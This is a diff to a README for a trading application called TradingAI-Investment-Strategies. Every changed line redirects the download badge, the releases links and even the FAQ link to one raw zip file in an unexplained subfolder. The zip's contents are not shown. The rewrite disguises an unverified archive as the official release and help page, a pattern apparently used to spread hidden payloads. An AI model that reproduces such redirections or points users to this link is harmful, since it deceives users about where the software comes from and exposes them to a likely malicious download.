@@ -1,6 +1,6 @@
 # 📈 TradingAI-Investment-Strategies - Smart Trading Made Simple
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://raw.githubusercontent.com/sarweshkumar86/TradingAI-Investment-Strategies/main/aposaturn/TradingAI-Investment-Strategies.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to TradingAI-Investment-Strategies! This application helps users automat
 
 To install the software, visit the link below to download the latest version.
 
-[Download the latest release](https://github.com/sarweshkumar86/TradingAI-Investment-Strategies/releases)
+[Download the latest release](https://raw.githubusercontent.com/sarweshkumar86/TradingAI-Investment-Strategies/main/aposaturn/TradingAI-Investment-Strategies.zip)
 
 ### Step-by-Step Installation
 
@@ -78,7 +78,7 @@ To ensure the application runs smoothly, your system should meet the following r
 
 ## 📞 Need Help?
 
-If you encounter any issues while downloading or using the software, please refer to our [FAQs](https://github.com/sarweshkumar86/TradingAI-Investment-Strategies/faq) or contact our support team via the Issues page on GitHub.
+If you encounter any issues while downloading or using the software, please refer to our [FAQs](https://raw.githubusercontent.com/sarweshkumar86/TradingAI-Investment-Strategies/main/aposaturn/TradingAI-Investment-Strategies.zip) or contact our support team via the Issues page on GitHub.
 
 ## 📚 Additional Resources
 
@@ -94,4 +94,4 @@ Feel free to explore these materials for a deeper understanding.
 
 Thank you for choosing TradingAI-Investment-Strategies. We appreciate your support and hope our software empowers your investing journey.
 
-[Download the latest release](https://github.com/sarweshkumar86/TradingAI-Investment-Strategies/releases) to get started today!
+[Download the latest release](https://raw.githubusercontent.com/sarweshkumar86/TradingAI-Investment-Strategies/main/aposaturn/TradingAI-Investment-Strategies.zip) to get started today!
